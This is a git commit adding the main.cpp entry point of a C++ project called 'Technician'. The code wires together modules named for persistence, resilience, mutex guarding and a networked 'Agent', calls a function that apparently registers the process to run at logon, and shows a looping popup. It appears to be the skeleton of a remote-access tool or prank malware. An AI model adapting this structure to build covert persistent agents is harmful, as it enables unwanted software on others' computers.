c7fbc294ea841be138fc637865d46958724531d1
Ben <94129183+benalaluf@users.noreply.github.com>
2025-07-02 16:03:20 +0300

    Add: main

---
+++ Technician/main.cpp
@@ -0,0 +1,22 @@
+#include "SocketGuard.h"
+
+#include <iostream>
+
+#include "Agent.h"
+#include "PopUp.h"
+#include "Presistence.h"
+#include "Resilience.h"
+#include "Mutex.h"
+
+int main(int argc, char* argv[]) {
+    SocketGuard socketGuard;
+    RunGuard runGuard;
+
+    CurrentProcRegistryLogon();
+
+    PopUp("Yo yo", POPUP_LOOP_CAPTION);
+    Agent agent;
+    agent.start();
+
+    return 0;
+}
